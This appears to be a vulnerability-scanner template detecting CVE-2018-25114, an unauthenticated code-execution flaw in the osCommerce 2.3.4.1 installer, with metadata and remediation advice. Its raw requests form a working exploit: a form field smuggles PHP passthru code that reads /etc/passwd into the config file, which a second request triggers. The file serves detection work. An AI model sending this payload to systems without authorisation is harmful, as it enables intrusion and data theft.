http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /install/install.php?step=4 HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: application/x-www-form-urlencoded


    DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27cat+%2Fetc%2Fpasswd%27%29%3B%2F%2A

    '
  - 'GET /install/includes/configure.php HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
id: CVE-2018-25114
info:
  author: Suman_Kar
  classification:
    cve-id: CVE-2018-25114
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    cwe-id: CWE-94
    epss-percentile: 0.98664
    epss-score: 0.71498
  description: 'osCommerce Online Merchant 2.3.4.1 contains a remote code execution
    caused by insecure default configuration and missing authentication in the installer
    workflow, letting unauthenticated attackers execute arbitrary PHP code via install_4.php,
    exploit requires accessible /install/ directory after installation.

    '
  impact: 'Unauthenticated attackers can execute arbitrary PHP code by exploiting
    the insecure installer workflow, leading to complete e-commerce platform compromise
    and access to customer data.

    '
  metadata:
    max-request: 2
    verified: true
  name: osCommerce 2.3.4.1 - Remote Code Execution
  reference:
  - https://www.exploit-db.com/exploits/50128
  - https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution
  - https://www.exploit-db.com/exploits/44374
  - https://www.vulncheck.com/advisories/oscommerce-installer-unauth-config-file-injection-php-code-execution
  remediation: 'Remove the /install/ directory after installation and upgrade to a
    patched version of osCommerce.

    '
  severity: critical
  tags: cve,cve2018,rce,oscommerce,edb,vuln,vkev
